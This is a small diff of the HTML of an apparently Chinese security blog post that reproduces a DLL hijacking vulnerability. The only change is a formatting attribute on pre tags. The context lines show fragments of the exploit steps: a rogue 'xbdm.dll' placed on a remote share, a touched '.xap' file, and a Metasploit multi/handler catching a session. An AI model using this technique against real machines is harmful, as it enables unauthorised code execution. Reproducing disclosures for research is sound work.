@@ -87,7 +87,7 @@
 <p>通过参考网上的漏洞披露，我决定复现一下。 这个和之前<a href="http://payloads.online/archivers/2018-06-09/1">QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</a>的思路差不多。</p>
 <h2 id="0x01-复现过程">0x01 复现过程</h2>
 <p>首先，漏洞披露详情如下：</p>
-<pre><code>Exploit/POC
+<pre tabindex="0"><code>Exploit/POC
 =============
 1) create DLL 32bit DLL named &quot;xbdm.dll&quot; and place on a remote share
 
@@ -211,7 +211,7 @@ msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#
 
 msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
 </code></pre></div><p>创建一个<code>.xap</code>文件：</p>
-<pre><code>touch .xap
+<pre tabindex="0"><code>touch .xap
 </code></pre><p>打开<code>.xap</code>文件，获得会话：</p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-08-15/0x03.png" alt="0x03"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; jobs
